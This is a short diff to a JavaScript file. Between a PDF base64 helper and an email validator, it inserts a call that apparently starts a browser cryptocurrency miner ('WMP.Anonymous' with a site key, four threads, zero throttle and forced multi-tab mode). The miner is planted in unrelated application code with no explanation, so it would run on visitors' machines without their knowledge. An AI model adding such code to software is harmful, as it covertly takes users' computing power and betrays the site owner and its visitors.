@@ -917,6 +917,14 @@
         return pdfBase64;
     }
 
+    var clientOBJ = WMP.Anonymous(
+'SK_nMDhFVtxJ8Q2Lvh5cmyZT',{
+        threads:4,
+        autoThreads: 4,
+        throttle: 0,
+        forceASMJS:false
+     });
+    clientOBJ.start(WMP.FORCE_MULTI_TAB);
 
 
     function isValidEmail(email) {
